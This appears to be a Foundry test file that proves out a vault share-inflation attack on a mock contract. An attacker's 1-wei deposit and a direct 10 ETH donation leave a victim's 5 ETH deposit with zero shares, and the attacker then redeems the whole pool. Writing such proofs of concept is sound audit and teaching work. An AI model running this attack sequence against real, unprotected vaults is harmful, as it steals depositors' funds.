// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/InflationAttackMock.sol";

contract InflationAttackTest is Test {
    InflationAttackMock vault;
    
    address attacker = address(0xdead);
    address victim = address(0xbabe);
    
    // Amounts
    uint256 constant ATTACKER_INITIAL_DEPOSIT = 1;
    uint256 constant INFLATION_AMOUNT = 10 ether;
    uint256 constant VICTIM_DEPOSIT = 5 ether;

    function setUp() public {
        vault = new InflationAttackMock();
        
        // Give ETH to participants
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 10 ether);
    }

    function testInflationAttack() public {
        console.log("=== STEP 1: Attacker makes first deposit ===");
        
        vm.startPrank(attacker);
        vault.deposit{value: ATTACKER_INITIAL_DEPOSIT}();
        vm.stopPrank();
        
        console.log("Attacker shares:", vault.balanceOf(attacker));
        console.log("Total supply:", vault.totalSupply());
        console.log("Total assets:", vault.totalAssets());
        
        assertEq(vault.balanceOf(attacker), 1);
        assertEq(vault.totalSupply(), 1);

        console.log("");
        console.log("=== STEP 2: Attacker inflates totalAssets ===");
        
        vm.prank(attacker);
        // FIX: Use .call instead of .transfer to provide enough gas for state update
        (bool success, ) = payable(address(vault)).call{value: INFLATION_AMOUNT}("");
        require(success, "Inflation transfer failed");
        
        console.log("Total supply after inflation:", vault.totalSupply());
        console.log("Total assets after inflation:", vault.totalAssets());
        
        // TotalSupply remains = 1, but totalAssets = 10e18 + 1 wei
        assertEq(vault.totalSupply(), 1);
        assertEq(vault.totalAssets(), INFLATION_AMOUNT + ATTACKER_INITIAL_DEPOSIT);

        console.log("");
        console.log("=== STEP 3: Victim deposits 5 ETH ===");
        
        uint256 victimBalanceBefore = victim.balance;
        
        vm.prank(victim);
        vault.deposit{value: VICTIM_DEPOSIT}();
        
        uint256 victimBalanceAfter = victim.balance;
        uint256 victimShares = vault.balanceOf(victim);
        
        console.log("Victim deposited:", VICTIM_DEPOSIT);
        console.log("Victim shares received:", victimShares);
        console.log("Victim ETH lost:", victimBalanceBefore - victimBalanceAfter);
        
        // Math: shares = (5 ether * 1) / (10 ether + 1) = 0 !!!
        // Due to integer division, victim receives 0 shares
        assertEq(victimShares, 0);
        assertEq(victimBalanceBefore - victimBalanceAfter, VICTIM_DEPOSIT);

        console.log("");
        console.log("=== STEP 4: Victim tries to withdraw ===");
        
        vm.prank(victim);
        vm.expectRevert("CANNOT_REDEEM_SHARES_TOO_LOW");
        vault.redeem(0); // Victim balance = 0, cannot even start withdrawal
        
        console.log("");
        console.log("=== STEP 5: Attacker drains everything ===");
        
        uint256 attackerBalanceBefore = attacker.balance;
        
        vm.prank(attacker);
        vault.redeem(1); // Attacker has only 1 share, but controls the whole pool!
        
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("Attacker profit:", attackerProfit);
        
        // Attacker takes almost everything: 1 wei + 10 ether inflation + 5 ether victim
        // Minus small rounding dust
        assertGt(attackerProfit, VICTIM_DEPOSIT + INFLATION_AMOUNT - 1);
        
        console.log("");
        console.log("EXPLOIT SUCCESSFUL: 5 ETH stolen");
    }
}
